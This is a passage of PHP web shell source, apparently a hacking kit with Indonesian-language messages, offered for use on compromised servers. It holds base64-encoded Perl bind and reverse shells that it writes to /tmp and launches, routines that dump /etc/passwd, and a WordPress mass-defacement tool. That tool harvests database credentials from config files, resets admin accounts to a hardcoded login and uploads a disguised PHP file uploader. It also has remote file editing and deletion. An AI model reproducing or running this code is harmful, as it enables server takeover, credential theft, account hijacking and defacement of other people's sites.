c3MDAiPiBDb2RlZCBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIDwvZm9udD48YnI+DQo8Zm9ybSBtZXRob2Q9Z2V0IGFjdGlvbj0iJy4kbWUuJyI+DQo8dGV4dGFyZWEgY2xhc3M9ImFyZWEiIHJvd3M9IjEzIiBuYW1lPSJTMSIgY29scz0iNzAiID4nOw0KDQppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfR0VUWydleGVjbWV0aG9kJ10oJF9HRVRbJ2NvbW1hbmQnXSk7fQ0KaWYgKHN0cmxlbigkX1BPU1RbJ2NvbW1hbmQnXSk+MSAmJiAkX1BPU1RbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfUE9TVFsnZXhlY21ldGhvZCddKCRfUE9TVFsnY29tbWFuZCddKTt9DQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddPT0icG9wZW4iKXsNCnBvcGVuKCRfR0VUWydjb21tYW5kJ10sInIiKTt9DQoNCmVjaG8nPC90ZXh0YXJlYT4NCjxwPjxjZW50ZXI+SWYgbm90aGluZyB3b3JrIGl0IG1lYW5zIHRoYXQgcGVybCBpcyBub3QgZW5hYmxlZCBpbiB0aGlzIHNlcnZlciA6KDwvY2VudGVyPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPjxzdHJvbmc+Q29tbWFuZDogcGVybCByZXZlcnNlLnBsIHlvdXJJUCBQb3J0PC9zdHJvbmc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9InZ3IiBzaXplPSI1MCIgdmFsdWU9ImNtZCI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI0MyI+IDxzZWxlY3QgbmFtZT1leGVjbWV0aG9kPg0KPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIj5TeXN0ZW08L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9ImV4ZWMiPkV4ZWM8L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9InBhc3N0aHJ1Ij5QYXNzdGhydTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9InBvcGVuIj5wb3Blbjwvb3B0aW9uPg0KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIj4NCjwvcD48L2Zvcm0+JzsNCj8+';
	$file = fopen("kit.php" ,"w+");
	$write = fwrite ($file ,base64_decode($zonop));
	fclose($file);

	echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Perl Connect Shell Priv8</span></b><center><br><iframe src=Backperlrev/kit.php width=75% height=60% frameborder=0></iframe></div></center>";

}
elseif($_GET['do'] == 'bc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['do'] == 'passwbypass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
//

//
} elseif($_GET['do'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "heninoor27";
		$pass = "heninoor27";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal mepes...</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=lime>$user</font><br>";
            	        echo "[+] password: <font color=lime>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By Mr.ToKeiChun69' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} elseif($_GET['do'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "heninoor27";
		$pass = "heninoor27";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By Mr.ToKeiChun69' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	function Delete($path)
{
    if (is_dir($path) === true)
    {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
        {
            Delete(realpath($path) . '/' . $file);
        }
        return rmdir($path);
    }
    else if (is_file($path) === true)
    {
        return unlink($path);
    }
    return false;
}
	$delete_dir = Delete($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
